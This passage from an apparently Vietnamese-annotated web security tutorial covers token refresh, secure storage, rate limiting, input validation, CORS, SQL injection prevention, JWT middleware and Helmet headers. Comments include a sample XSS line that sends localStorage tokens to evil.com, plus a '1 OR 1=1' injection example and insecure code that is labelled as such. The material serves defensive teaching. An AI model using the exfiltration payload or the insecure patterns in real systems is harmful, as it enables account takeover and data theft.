  // Access token hết hạn sau 15 phút → refresh sau 14 phút (dư 1 phút buffer)
  useEffect(() => {
    // 💡 useEffect: Chạy khi component mount
    // 💡 [] deps: Chỉ chạy 1 lần khi mount

    const refreshInterval = setInterval(async () => {
      // 💡 setInterval: Chạy function mỗi X milliseconds
      // 💡 async: Function async để gọi API

      console.log('🔄 Đang refresh access token...');

      const res = await fetch('/api/refresh', {
        method: 'POST', // 📡 POST request
        credentials: 'include'  // 🍪 Gửi cookies (chứa refresh token)
        // 💡 credentials: 'include' → Browser tự động gửi cookies
        // 💡 Refresh token trong httpOnly cookie → Tự động gửi
      });

      if (res.ok) {
        // ✅ Refresh thành công
        const data = await res.json(); // 📦 Parse JSON response
        setAccessToken(data.accessToken);  // 💾 Update access token mới
        // 💡 setAccessToken: Update state với token mới
        // 💡 Components sử dụng token sẽ tự động re-render
        console.log('✅ Access token đã được làm mới');
      } else {
        // ❌ Refresh thất bại (refresh token hết hạn, không hợp lệ...)
        console.log('❌ Refresh thất bại → User cần login lại');
        setAccessToken(null); // 🗑️ Clear access token
        // 💡 Token null → Components biết user chưa login → Redirect login
      }
    }, 14 * 60 * 1000); // ⏰ 14 phút = 840,000ms
    // 💡 14 phút: Refresh trước khi token hết hạn (15 phút)
    // 💡 Buffer 1 phút: Đảm bảo token luôn valid, không bị hết hạn giữa chừng

    // 🧹 Cleanup interval khi unmount (Quan trọng để tránh memory leak!)
    return () => clearInterval(refreshInterval);
    // 💡 Cleanup function: Chạy khi component unmount
    // 💡 clearInterval: Dừng interval → Tránh memory leak
  }, []); // 📊 Empty deps → Chỉ chạy 1 lần khi mount

  return (
    <AuthContext.Provider value={{ accessToken }}>
      {/* 💡 Provider: Wrap app để share accessToken cho tất cả components */}
      {children}
    </AuthContext.Provider>
  );
}

// 🪝 Hook sử dụng auth (Custom hook để dùng auth context)
export const useAuth = () => useContext(AuthContext);
// 💡 useAuth: Hook để lấy accessToken từ context
// 💡 useContext: React hook để access context value
// 💡 Usage: const { accessToken } = useAuth();

// 📄 Component gọi API với authentication (Ví dụ sử dụng auth)
function UserProfile() {
  const { accessToken } = useAuth(); // 🔐 Lấy access token từ context
  const [profile, setProfile] = useState(null); // 📦 State lưu profile data

  useEffect(() => {
    if (accessToken) {
      // ✅ Có access token → Gọi API lấy profile
      fetch('/api/profile', {
        headers: {
          'Authorization': `Bearer ${accessToken}`  // 🔑 Gửi access token trong header
          // 💡 Authorization header: Format "Bearer <token>"
          // 💡 Server verify token → Trả về profile data
        }
      })
        .then(res => res.json()) // 📦 Parse JSON
        .then(data => setProfile(data)); // 💾 Lưu profile vào state
    }
  }, [accessToken]); // 📊 Chạy lại khi accessToken thay đổi
  // 💡 Khi token refresh → accessToken thay đổi → useEffect chạy lại → Fetch profile mới

  return <div>Thông tin user: {profile?.email}</div>; // 📝 Hiển thị email
  // 💡 profile?.email: Optional chaining → Không lỗi nếu profile null
}

// ============================================
// 5️⃣ SECURE STORAGE (LƯU TRỮ AN TOÀN)
// ============================================

// Nguyên tắc: KHÔNG BAO GIỜ lưu sensitive data ở client-side (localStorage/sessionStorage)
// Lý do: XSS attack có thể đọc localStorage → steal tokens, passwords, credit cards

// ❌ CÁCH LƯU KHÔNG AN TOÀN
// localStorage/sessionStorage: JavaScript có thể đọc → XSS steal được
localStorage.setItem('token', accessToken); // ❌ XSS đọc được!
localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!
localStorage.setItem('creditCard', '1234-5678-9012-3456'); // ❌ KHÔNG BAO GIỜ làm!
localStorage.setItem('password', 'user123'); // ❌ Cực kỳ nguy hiểm!

// Kịch bản tấn công:
// 1. Hacker inject XSS: <script>fetch('https://evil.com?data='+localStorage.getItem('token'))</script>
// 2. Script chạy → đọc localStorage → gửi token về server hacker
// 3. Hacker dùng token → truy cập account của user

// ✅ CÁCH LƯU AN TOÀN

// 1. 🍪 HttpOnly Cookies cho Refresh Token (bảo mật nhất)
// httpOnly: JavaScript KHÔNG thể đọc → XSS không steal được
// Server set cookie trong response:
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,    // ✅ JS không access được
  // 💡 httpOnly: Cookie chỉ gửi với HTTP requests
  // 💡 JavaScript KHÔNG đọc được → document.cookie không thấy
  // 💡 XSS attack → Không steal được refresh token

  secure: true,      // ✅ Chỉ gửi qua HTTPS
  // 💡 secure: Cookie chỉ gửi qua HTTPS (không HTTP)
  // 💡 Ngăn cookie bị intercept qua HTTP (man-in-the-middle)

  sameSite: 'strict', // ✅ Chống CSRF
  // 💡 sameSite: 'strict' → Cookie chỉ gửi cho same-site requests
  // 💡 Request từ evil.com → Browser KHÔNG gửi cookie → CSRF thất bại

  maxAge: 7 * 24 * 60 * 60 * 1000  // ⏰ 7 ngày
  // 💡 maxAge: Thời gian cookie tồn tại (milliseconds)
  // 💡 7 * 24 * 60 * 60 * 1000 = 604,800,000ms = 7 ngày
});

// Client không thể đọc cookie này:
console.log(document.cookie); // 📝 Không thấy refreshToken (vì httpOnly)
// 💡 document.cookie: Chỉ thấy cookies không có httpOnly
// 💡 refreshToken có httpOnly → Không xuất hiện → An toàn ✅

// 2. 🧠 Memory-only cho Access Token (lưu trong React state/context)
// Access token chỉ tồn tại trong memory → mất khi reload page
function App() {
  const [accessToken, setAccessToken] = useState<string | null>(null);
  // 💡 accessToken: State lưu token trong memory
  // 💡 Memory: RAM → Mất khi reload page → An toàn nhất

  // 🔐 Khi login thành công
  const handleLogin = async (email: string, password: string) => {
    const res = await fetch('/api/login', {
      method: 'POST', // 📡 POST request
      body: JSON.stringify({ email, password }) // 📦 Gửi credentials
    });

    const data = await res.json(); // 📦 Parse response
    setAccessToken(data.accessToken); // ✅ Lưu trong memory (React state)
    // 💡 setAccessToken: Update state với token
    // 💡 Token chỉ tồn tại trong memory → Reload page → Mất
    // 💡 ⚠️ KHÔNG lưu vào localStorage → XSS có thể steal
  };

  return <div>App content...</div>;
}
// 💡 Best practice: Access token trong memory → An toàn nhất
// 💡 Trade-off: Reload page → Mất token → Phải login lại (hoặc dùng refresh token)

// 3. 📋 Session Storage (tốt hơn localStorage nhưng vẫn có risk)
// sessionStorage: Tồn tại trong 1 tab, mất khi đóng tab
// Vẫn có thể bị XSS steal → chỉ dùng cho non-sensitive data
sessionStorage.setItem('theme', 'dark'); // ✅ OK cho data không nhạy cảm
// 💡 theme: UI preference → Không nhạy cảm → OK
sessionStorage.setItem('language', 'vi'); // ✅ OK
// 💡 language: UI preference → Không nhạy cảm → OK

// ❌ KHÔNG dùng cho sensitive data
sessionStorage.setItem('token', token); // ❌ Vẫn có XSS risk
// 💡 ⚠️ sessionStorage: JavaScript vẫn đọc được
// 💡 XSS attack → Steal token → Nguy hiểm!
// 💡 Chỉ dùng cho non-sensitive data (theme, language, UI state...)

// 4. 🔐 Encrypted Storage (Mã hóa trước khi lưu - fallback option)
// Chỉ dùng khi BẮT BUỘC phải lưu client-side
import CryptoJS from 'crypto-js'; // 📦 Library mã hóa AES

const SECRET_KEY = 'your-encryption-key'; // 🔑 Lấy từ env hoặc server
// 💡 SECRET_KEY: Key để mã hóa/giải mã
// 💡 ⚠️ Lưu ý: Key vẫn ở client → Hacker có thể tìm thấy
// 💡 Best: Lấy key từ server (không hardcode)

// 🔐 Encrypt trước khi lưu (Mã hóa data)
const encryptData = (data: string) => {
  return CryptoJS.AES.encrypt(data, SECRET_KEY).toString();
  // 💡 AES.encrypt(): Mã hóa data với AES-256
  // 💡 toString(): Convert sang string để lưu
  // 💡 Kết quả: Chuỗi base64 (VD: "U2FsdGVkX1...")
};

// 🔓 Decrypt khi đọc (Giải mã data)
const decryptData = (encrypted: string) => {
  const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  // 💡 AES.decrypt(): Giải mã data
  // 💡 bytes: WordArray object

  return bytes.toString(CryptoJS.enc.Utf8);
  // 💡 toString(Utf8): Convert sang UTF-8 string
  // 💡 Kết quả: Data gốc (plaintext)
};

// 💾 Lưu data đã mã hóa
const encrypted = encryptData(sensitiveData); // 🔐 Mã hóa trước
localStorage.setItem('data', encrypted); // 💾 Lưu encrypted data
// 💡 Lưu encrypted string → Nếu hacker đọc được → Chỉ thấy ký tự lộn xộn

// 📖 Đọc và giải mã
const encrypted = localStorage.getItem('data'); // 📖 Lấy encrypted data
const decrypted = decryptData(encrypted); // 🔓 Giải mã
// 💡 Decrypt để lấy data gốc

// ⚠️ LƯU Ý: Encryption KHÔNG an toàn 100%
// - Secret key vẫn ở client → hacker có thể tìm thấy
// - Chỉ làm khó hacker hơn, KHÔNG ngăn được hoàn toàn
// 💡 ⚠️ QUAN TRỌNG: Encryption chỉ là lớp bảo vệ thêm
// 💡 ⚠️ KHÔNG thay thế được HttpOnly cookies cho auth tokens
// 💡 ⚠️ Best practice: Vẫn nên tránh lưu sensitive data ở client-side

// 📋 BẢNG SO SÁNH STORAGE OPTIONS
/*
┌──────────────────────┬─────────────┬─────────────┬──────────────────┐
│ Storage Type         │ XSS Risk    │ CSRF Risk   │ Best Use Case    │
├──────────────────────┼─────────────┼─────────────┼──────────────────┤
│ HttpOnly Cookie      │ ✅ Low      │ ⚠️ Medium   │ Refresh Token    │
│ Memory (React State) │ ✅ Low      │ ✅ Low      │ Access Token     │
│ localStorage         │ ❌ High     │ ✅ Low      │ Non-sensitive    │
│ sessionStorage       │ ❌ High     │ ✅ Low      │ Non-sensitive    │
│ Encrypted Storage    │ ⚠️ Medium   │ ✅ Low      │ Fallback only    │
└──────────────────────┴─────────────┴─────────────┴──────────────────┘
*/

// ✅ BEST PRACTICE:
// - Refresh Token → httpOnly cookie (server-side)
// - Access Token → React state/Context (memory)
// - User preferences → localStorage (non-sensitive)
// - NEVER store passwords, credit cards, API keys trong client

// ============================================
// 6️⃣ API SECURITY (BẢO MẬT API)
// ============================================

// 🛡️ A. Rate Limiting (Giới Hạn Số Request)
// Mục đích: Ngăn DDoS attack, brute-force attack, spam
// VD: Hacker thử 1 triệu passwords → rate limit chặn sau 5 lần thử

const rateLimit = require('express-rate-limit'); // 📦 Library rate limiting cho Express

// 🔒 Rate limiter cho toàn bộ API (Global rate limiter)
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // ⏰ Cửa sổ thời gian: 15 phút
  // 💡 windowMs: Khoảng thời gian đếm requests (milliseconds)
  // 💡 15 * 60 * 1000 = 900,000ms = 15 phút

  max: 100, // 📊 Tối đa 100 requests trong 15 phút (từ 1 IP)
  // 💡 max: Số requests tối đa trong window
  // 💡 Vượt 100 requests → Trả về 429 Too Many Requests
  // 💡 Per IP: Mỗi IP có limit riêng

  message: 'Quá nhiều requests, vui lòng thử lại sau', // 📝 Message khi vượt limit
  // 💡 message: Response message khi rate limit exceeded

  standardHeaders: true, // 📋 Trả về RateLimit headers (X-RateLimit-*)
  // 💡 standardHeaders: Gửi headers như X-RateLimit-Limit, X-RateLimit-Remaining
  // 💡 Client có thể đọc headers để biết limit và số requests còn lại

  legacyHeaders: false,  // 🚫 Tắt headers cũ
  // 💡 legacyHeaders: Headers cũ (X-RateLimit-*) → Tắt vì đã có standardHeaders
});

// 🔒 Áp dụng cho tất cả API routes
app.use('/api/', apiLimiter);
// 💡 app.use(): Middleware áp dụng cho tất cả routes bắt đầu với /api/
// 💡 Mọi request đến /api/* đều bị rate limit
// 💡 VD: /api/users, /api/posts... → Đều có rate limit

// 🔒 Rate limiter nghiêm ngặt hơn cho login (chống brute-force)
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // ⏰ 15 phút
  max: 5, // 📊 Chỉ cho 5 lần thử login trong 15 phút
  // 💡 max: 5 → Nghiêm ngặt hơn global limiter (100)
  // 💡 Lý do: Login là endpoint nhạy cảm → Cần bảo vệ chặt chẽ hơn
  // 💡 Ngăn brute-force: Hacker không thể thử nhiều passwords

  message: 'Quá nhiều lần thử login, tài khoản tạm khóa 15 phút', // 📝 Message
  skipSuccessfulRequests: true // ✅ Không đếm request thành công
  // 💡 skipSuccessfulRequests: Login thành công → Không đếm vào limit
  // 💡 Chỉ đếm failed attempts → User login thành công không bị block
});

app.post('/api/login', loginLimiter, async (req, res) => {
  // 🔐 Login logic với rate limiting
  // 💡 loginLimiter: Middleware chạy trước login logic
  // 💡 Nếu vượt 5 attempts → Trả 429 → Không chạy login logic
  // 💡 Nếu OK → Tiếp tục login logic
});
// 💡 Lợi ích: Ngăn brute-force attack → Hacker chỉ thử được 5 lần/15 phút
// 💡 Security: Giảm thiệt hại nếu hacker có password list

// 🛡️ B. Input Validation (Kiểm Tra Dữ Liệu Đầu Vào)
// Nguyên tắc: KHÔNG BAO GIỜ tin tưởng input từ client
// Luôn validate ở server-side (client validation có thể bị bypass)

import { z } from 'zod'; // 📦 Thư viện validation mạnh mẽ
// 💡 Zod: TypeScript-first schema validation
// 💡 Tự động type inference → Type-safe validation

// 📋 Schema cho transfer request (Định nghĩa format data hợp lệ)
const transferSchema = z.object({
  amount: z.number()
    .positive('Số tiền phải > 0')  // ✅ Phải là số dương
    // 💡 positive(): Số phải > 0
    // 💡 Message: Error message khi validation fail

    .max(1000000, 'Số tiền tối đa 1 triệu'),  // ✅ Giới hạn trên
    // 💡 max(): Số không được vượt quá 1,000,000
    // 💡 Ngăn transfer số tiền quá lớn (fraud protection)

  accountNumber: z.string()
    .regex(/^\d{10}$/, 'Số tài khoản phải có 10 chữ số'),  // ✅ Đúng format
    // 💡 regex(): Pattern matching
    // 💡 /^\d{10}$/: Chỉ chứa 10 chữ số (0-9)
    // 💡 ^: Bắt đầu, \d: Chữ số, {10}: Đúng 10 ký tự, $: Kết thúc
    // 💡 VD: "1234567890" → ✅, "12345" → ❌, "abc1234567" → ❌

  description: z.string()
    .max(200, 'Mô tả tối đa 200 ký tự') // ✅ Giới hạn độ dài
    .optional()  // ✅ Field không bắt buộc
    // 💡 optional(): Field có thể không có
    // 💡 Nếu có → Phải là string, max 200 ký tự
    // 💡 Nếu không có → OK
});

// 🔒 API endpoint với validation
app.post('/api/transfer', async (req, res) => {
  try {
    // ✅ Validate input với Zod
    const data = transferSchema.parse(req.body);
    // 💡 parse(): Validate và parse data
    // 💡 Nếu hợp lệ → Trả về data đã validate (type-safe)
    // 💡 Nếu không hợp lệ → Throw ZodError

    // ✅ Validation pass → data đã clean và đúng type
    console.log('✅ Data hợp lệ:', data);
    // 💡 data: Đã được validate → Type-safe, clean
    // 💡 TypeScript biết: data.amount là number, data.accountNumber là string...

    // 💼 Xử lý transfer với data đã validate
    const result = await processTransfer(data);
    // 💡 processTransfer(): Logic chuyển tiền
    // 💡 Data đã validate → An toàn để xử lý

    res.json({ success: true, result }); // 📤 Trả kết quả

  } catch (error) {
    // ❌ Validation fail → trả lỗi chi tiết
    if (error instanceof z.ZodError) {
      // 💡 ZodError: Error từ Zod validation
      console.log('❌ Validation errors:', error.errors);
      // 💡 error.errors: Array chứa các lỗi validation chi tiết
      // 💡 VD: [{ path: ['amount'], message: 'Số tiền phải > 0' }]

      return res.status(400).json({
        error: 'Dữ liệu không hợp lệ', // 📝 Error message tổng quát
        details: error.errors // 📋 Chi tiết các lỗi
        // 💡 details: Giúp client biết field nào sai, sai như thế nào
      });
      // 💡 400 Bad Request: Client gửi data không hợp lệ
    }

    // ❌ Lỗi khác (không phải validation error)
    res.status(500).json({ error: 'Lỗi server' });
    // 💡 500 Internal Server Error: Lỗi server (database, code...)
  }
});
// 💡 Lợi ích: Validate input → Ngăn SQL injection, XSS, invalid data
// 💡 Type-safe: TypeScript biết type của data sau khi validate
// 💡 User-friendly: Trả lỗi chi tiết → User biết sửa gì

// 🛡️ C. CORS Configuration (Kiểm Soát Nguồn Gốc Requests)
// CORS: Quy định domain nào được phép call API
import cors from 'cors';

// CORS config nghiêm ngặt
const corsOptions = {
  origin: [
    'https://yourdomain.com',      // Production domain
    'https://staging.yourdomain.com', // Staging
  ],
  // KHÔNG dùng origin: '*' trong production (cho phép mọi domain)

  methods: ['GET', 'POST', 'PUT', 'DELETE'], // HTTP methods cho phép

  allowedHeaders: [
    'Content-Type',
    'Authorization',
    'X-CSRF-Token'
  ], // Headers cho phép

  credentials: true, // Cho phép gửi cookies

  maxAge: 86400 // Cache preflight request 24h
};

app.use(cors(corsOptions));

// 🛡️ D. SQL Injection Prevention (Ngăn Chặn SQL Injection)
// LUÔN dùng parameterized queries, KHÔNG nối string SQL

// ❌ KHÔNG AN TOÀN: String concatenation (CỰC KỲ NGUY HIỂM!)
const userId = req.params.id; // 📦 Lấy ID từ URL params
const query = `SELECT * FROM users WHERE id = ${userId}`; // 🚨 SQL Injection risk!
// 💡 Template literal: Nối string trực tiếp vào SQL
// 💡 ⚠️ NGUY HIỂM: Hacker có thể inject SQL code
// 💡 VD: userId = "1 OR 1=1" → Query: "SELECT * FROM users WHERE id = 1 OR 1=1"
// 💡 → Trả về TẤT CẢ users → Data leak!

db.query(query); // ❌ Trả về tất cả users!
// 💡 Query chạy với SQL injection → Lấy được data không được phép

// ✅ AN TOÀN: Parameterized query (Sử dụng placeholder)
const userId = req.params.id; // 📦 Lấy ID từ URL params
const query = 'SELECT * FROM users WHERE id = ?'; // ✅ Placeholder
// 💡 ?: Placeholder → Database sẽ thay thế an toàn
// 💡 Library tự động escape special characters

db.query(query, [userId]); // ✅ Library tự động escape
// 💡 [userId]: Array chứa values cho placeholders
// 💡 Library tự động escape userId → Ngăn SQL injection
// 💡 VD: userId = "1 OR 1=1" → Escaped thành "1 OR 1=1" (string literal)
// 💡 → Query: "SELECT * FROM users WHERE id = '1 OR 1=1'" → Không match → An toàn ✅

// 🛡️ E. API Authentication (Xác Thực API)
// Middleware kiểm tra token (Middleware xác thực token)
const authenticateToken = (req, res, next) => {
  // 🔍 Lấy token từ header
  const authHeader = req.headers['authorization']; // 📋 Lấy Authorization header
  // 💡 req.headers: Object chứa tất cả HTTP headers
  // 💡 'authorization': Header chứa token (format: "Bearer <token>")

  const token = authHeader && authHeader.split(' ')[1]; // 🔑 Extract token
  // 💡 authHeader.split(' '): Tách string "Bearer TOKEN" → ["Bearer", "TOKEN"]
  // 💡 [1]: Lấy phần tử thứ 2 (token)
  // 💡 VD: "Bearer abc123" → "abc123"
  // 💡 authHeader &&: Kiểm tra authHeader có tồn tại không

  if (!token) {
    // ❌ Không có token → Trả lỗi 401
    return res.status(401).json({ error: 'Thiếu access token' });
    // 💡 401: Unauthorized - Chưa đăng nhập
    // 💡 Client cần gửi token trong Authorization header
  }

  try {
    // ✅ Verify token (Xác minh token hợp lệ)
    const decoded = jwt.verify(token, process.env.JWT_SECRET!);
    // 💡 jwt.verify(): Verify token signature và expiration
    // 💡 Nếu hợp lệ → Trả về decoded payload
    // 💡 Nếu không hợp lệ (sai signature, hết hạn...) → Throw error

    req.user = decoded; // 💾 Gắn user info vào request
    // 💡 req.user: Object chứa thông tin user từ token
    // 💡 VD: { userId: 123, email: 'user@example.com', role: 'user' }
    // 💡 Các middleware/route handlers sau có thể dùng req.user

    next(); // ➡️ Token hợp lệ → tiếp tục middleware chain
    // 💡 next(): Gọi middleware/route handler tiếp theo
  } catch (error) {
    // ❌ Token không hợp lệ (sai signature, hết hạn...)
    return res.status(403).json({ error: 'Token không hợp lệ hoặc hết hạn' });
    // 💡 403: Forbidden - Token không hợp lệ
    // 💡 Client cần refresh token hoặc login lại
  }
};

// 🔒 Áp dụng middleware cho protected routes (Routes cần xác thực)
app.get('/api/profile', authenticateToken, (req, res) => {
  // 💡 authenticateToken: Middleware chạy trước route handler
  // 💡 Nếu token không hợp lệ → Trả 403 → Không chạy route handler
  // 💡 Nếu token hợp lệ → req.user có data → Chạy route handler

  // req.user đã có thông tin từ token
  res.json({ user: req.user }); // 📤 Trả thông tin user
  // 💡 req.user: Đã được set bởi authenticateToken middleware
});

app.post('/api/transfer', authenticateToken, apiLimiter, async (req, res) => {
  // 🔒 Multiple layers: Authentication + Rate limiting + Validation
  // 💡 authenticateToken: Kiểm tra token trước
  // 💡 apiLimiter: Rate limit sau khi authenticate
  // 💡 Validation: Validate input trong route handler
  // 💡 → Defense in depth: Nhiều lớp bảo vệ
  // ...
});
// 💡 Best practice: Kết hợp nhiều middleware → Bảo vệ toàn diện
// 💡 Order: authenticateToken → apiLimiter → Validation → Business logic

// ============================================
// 7️⃣ SECURITY HEADERS (HEADERS BẢO MẬT)
// ============================================

// Security Headers: HTTP response headers tăng cường bảo mật
// Helmet.js: Thư viện tự động set các security headers

import helmet from 'helmet'; // 📦 Helmet: Middleware tự động set security headers
import express from 'express';

const app = express();

// 🛡️ Áp dụng Helmet với config chi tiết
app.use(helmet({
  // 💡 helmet(): Middleware tự động set các security headers
  // 💡 Đơn giản, nhanh chóng, đầy đủ → Best practice

  // 1. 🔒 Content Security Policy (CSP) - Kiểm soát nguồn tài nguyên
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],  // 🔒 Mặc định chỉ load từ cùng origin
      // 💡 defaultSrc: Policy mặc định cho tất cả resources
      // 💡 'self': Chỉ cho phép load từ cùng domain
      // 💡 → Block tất cả resources từ domain khác (trừ khi được whitelist)

      scriptSrc: [
        "'self'",  // ✅ Scripts từ cùng domain
        // 💡 'self': Scripts từ cùng origin → Cho phép

        "'unsafe-inline'",  // ⚠️ Cho phép inline scripts (cần cho React)
        // 💡 'unsafe-inline': Cho phép <script>...</script> trong HTML
        // 💡 ⚠️ Cần cho React (inject inline scripts)
        // 💡 ⚠️ Có risk → Nhưng cần thiết cho React hydration

        "https://trusted-cdn.com"  // ✅ CDN tin cậy
        // 💡 Whitelist CDN cụ thể → Chỉ load scripts từ CDN này
        // 💡 Scripts từ evil.com → BLOCK → XSS thất bại
      ],

      styleSrc: [
        "'self'", // ✅ CSS từ cùng domain
        "'unsafe-inline'"  // ⚠️ Inline styles (cần cho styled-components)
        // 💡 'unsafe-inline': Cho phép <style>...</style> và inline styles
        // 💡 Cần cho styled-components (inject inline styles)
      ],

      imgSrc: [
        "'self'",  // ✅ Images từ domain
        "data:",   // ✅ Data URLs (base64 images)
        // 💡 data:: Cho phép data:image/png;base64,...
        "https:"   // ✅ HTTPS images
        // 💡 https:: Cho phép images từ bất kỳ HTTPS URL nào
      ],

      connectSrc: [
        "'self'",  // ✅ Fetch/WebSocket từ domain
        "https://api.example.com"  // ✅ API endpoints
        // 💡 connectSrc: Policy cho fetch, XMLHttpRequest, WebSocket
        // 💡 Chỉ cho phép connect đến whitelist → Ngăn data leak
      ],

      fontSrc: ["'self'", "https://fonts.gstatic.com"], // ✅ Fonts
      // 💡 fontSrc: Policy cho fonts
      // 💡 'self': Fonts từ domain
      // 💡 https://fonts.gstatic.com: Google Fonts CDN

      objectSrc: ["'none'"],  // 🚫 Không cho phép <object>, <embed>
      // 💡 objectSrc: Policy cho <object>, <embed> tags
      // 💡 'none': Block tất cả → Ngăn Flash, Java plugins (nguy hiểm)

      mediaSrc: ["'self'"],  // ✅ Video/Audio
      // 💡 mediaSrc: Policy cho <video>, <audio>
      // 💡 'self': Chỉ từ cùng domain

      frameSrc: ["'none'"]  // 🚫 Không cho phép iframe
      // 💡 frameSrc: Policy cho <iframe>
      // 💡 'none': Block tất cả → Ngăn clickjacking
    }
  },

  // 2. 🚫 X-Frame-Options - Chống Clickjacking
  // Clickjacking: Hacker nhúng site vào iframe, lừa user click vào button ẩn
  xFrameOptions: {
    action: 'deny'  // 🚫 Không cho phép site được nhúng trong iframe
    // 💡 deny: Block tất cả iframe embedding
    // 💡 Ngăn clickjacking: Hacker không thể embed trang trong iframe
  },
  // 💡 Hoặc: action: 'sameorigin' (chỉ iframe từ cùng domain)
  // 💡 sameorigin: Cho phép iframe từ cùng domain (có thể cần cho internal tools)

  // 3. 🔍 X-Content-Type-Options - Chống MIME type sniffing
  // noSniff: true → Browser không đoán MIME type, phải dùng đúng Content-Type
  noSniff: true,
  // 💡 noSniff: Browser phải dùng Content-Type header, không được đoán
  // 💡 VD: File .txt có MIME text/plain → browser KHÔNG execute như JavaScript
  // 💡 Ngăn MIME sniffing attacks: Hacker upload file độc → Browser đoán sai → Execute code

  // 4. 🔗 Referrer-Policy - Kiểm soát thông tin Referrer
  referrerPolicy: {
    policy: 'no-referrer'  // 🚫 Không gửi referrer header (giấu nguồn gốc request)
    // 💡 no-referrer: Không gửi Referer header
    // 💡 Bảo vệ privacy: Không leak thông tin về trang web trước đó
    // 💡 VD: User từ trang A → Trang B → Trang B không biết user đến từ đâu
  },
  // 💡 Các option khác:
  // 💡 'no-referrer-when-downgrade': Không gửi khi downgrade HTTPS → HTTP
  // 💡 'same-origin': Chỉ gửi cho same-origin requests
  // 💡 'strict-origin': Chỉ gửi origin (không full URL)

  // 5. 🛡️ X-XSS-Protection (Legacy, CSP tốt hơn)
  xssFilter: true,  // ✅ Enable XSS filter built-in của browser
  // 💡 xssFilter: Enable browser's built-in XSS protection
  // 💡 Legacy: CSP tốt hơn, nhưng vẫn nên enable để bảo vệ browser cũ

  // 6. 🔐 Strict-Transport-Security (HSTS)
  hsts: {
    maxAge: 31536000,  // ⏰ 1 năm (giây)
    // 💡 maxAge: Thời gian browser nhớ phải dùng HTTPS
    // 💡 31536000 = 31,536,000 giây = 1 năm

    includeSubDomains: true,  // ✅ Áp dụng cho subdomain
    // 💡 includeSubDomains: Áp dụng HSTS cho tất cả subdomain
    // 💡 VD: example.com → api.example.com, cdn.example.com đều phải HTTPS

    preload: true  // ✅ Đưa vào HSTS preload list
    // 💡 preload: Đưa vào HSTS preload list của browser
    // 💡 Browser biết phải dùng HTTPS ngay từ lần đầu truy cập
    // 💡 Không cần đợi response header → Bảo mật hơn
  }

}));
// 💡 Helmet tự động set tất cả headers → Đơn giản, nhanh chóng
// 💡 Best practice: Dùng Helmet thay vì set headers thủ công

// Hoặc set headers thủ công
app.use((req, res, next) => {
  // CSP Header
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline'"
  );

  // X-Frame-Options
  res.setHeader('X-Frame-Options', 'DENY');

  // X-Content-Type-Options
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // Referrer-Policy
  res.setHeader('Referrer-Policy', 'no-referrer');

  // Permissions-Policy (tắt features không dùng)
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'  // Tắt location, mic, camera
  );

  next();
});

// 📋 BẢNG TÓM TẮT SECURITY HEADERS
/*
┌────────────────────────────┬──────────────────────────────────────────┐
│ Header                     │ Mục Đích                                 │
├────────────────────────────┼──────────────────────────────────────────┤
│ Content-Security-Policy    │ Kiểm soát nguồn scripts, styles, images  │
│ X-Frame-Options            │ Chống Clickjacking (iframe embed)        │
│ X-Content-Type-Options     │ Chống MIME type sniffing                 │
│ Referrer-Policy            │ Kiểm soát thông tin referrer             │
│ Strict-Transport-Security  │ Bắt buộc HTTPS                           │
│ X-XSS-Protection           │ Enable browser XSS filter (legacy)       │
│ Permissions-Policy         │ Tắt browser features không dùng          │
└────────────────────────────┴──────────────────────────────────────────┘
*/

// ✅ Kiểm tra headers:
// 1. Mở DevTools → Network tab
// 2. Chọn request bất kỳ
// 3. Xem Response Headers
// 4. Hoặc dùng https://securityheaders.com để scan

// VÍ DỤ RESPONSE HEADERS:
/*
HTTP/2 200
content-security-policy: default-src 'self'
x-frame-options: DENY
x-content-type-options: nosniff
referrer-policy: no-referrer
strict-transport-security: max-age=31536000; includeSubDomains; preload
*/
```

**🎯 Security Checklist:**

```typescript
// ✅ Security Checklist cho Trading Platform

const securityChecklist = {
  transport: {
    https: true,
    hsts: true,
    tlsVersion: 'TLS 1.3',
    certificateExpiry: 'Valid',
  },

  xssPrevention: {
    inputSanitization: true,
    outputEncoding: true,
    cspHeaders: true,
    dompurify: true,
  },

  csrfProtection: {
    csrfTokens: true,
    sameSiteCookies: true,
    customHeaders: true,
  },

  authentication: {
    jwtTokens: true,
    refreshTokens: true,
    tokenExpiry: '15m',
    passwordHashing: 'bcrypt',
  },

  storage: {
    noSensitiveLocalStorage: true,
    httpOnlyCookies: true,
    encryptedData: true,
  },

  apiSecurity: {
    rateLimiting: true,
    inputValidation: true,
    cors: true,
    apiKeys: true,
  },

  headers: {
    contentSecurityPolicy: true,
    xFrameOptions: true,
    xContentTypeOptions: true,
    referrerPolicy: true,
  },
};
```

**Best Practices:**

1. **Defense in Depth**: Multiple layers of security
2. **Principle of Least Privilege**: Minimal permissions
3. **Input Validation**: Server-side validation always
4. **Secure Storage**: HttpOnly cookies, no localStorage for sensitive data
5. **Regular Updates**: Dependencies, libraries, frameworks
6. **Security Audits**: Penetration testing, code reviews
7. **Monitoring**: Log security events, detect anomalies

**Common Mistakes (Lỗi Bảo Mật Thường Gặp):**

```typescript
// ❌ LỖI 1: Lưu tokens trong localStorage (CỰC KỲ NGUY HIỂM!)
// Vấn đề: XSS có thể đọc localStorage → steal token
localStorage.setItem('token', token); // ❌ Nguy hiểm!
// 💡 ⚠️ NGUY HIỂM: localStorage có thể đọc được bởi bất kỳ JavaScript nào
// 💡 XSS attack: <script>fetch('evil.com?token='+localStorage.getItem('token'))</script>
// 💡 → Hacker steal token → Đăng nhập với account của user

localStorage.setItem('refreshToken', refreshToken); // ❌ Rất nguy hiểm!
// 💡 ⚠️ CỰC KỲ NGUY HIỂM: Refresh token dài hạn (7 ngày)
// 💡 Nếu bị steal → Hacker dùng được 7 ngày → Thiệt hại lớn!

// ✅ CÁCH SỬA: Dùng HttpOnly cookies
// Server:
res.cookie('refreshToken', token, {
  httpOnly: true, // ✅ JavaScript không đọc được
  // 💡 httpOnly: Cookie chỉ gửi với HTTP requests
  // 💡 JavaScript KHÔNG đọc được → XSS không steal được

  secure: true, // ✅ Chỉ gửi qua HTTPS
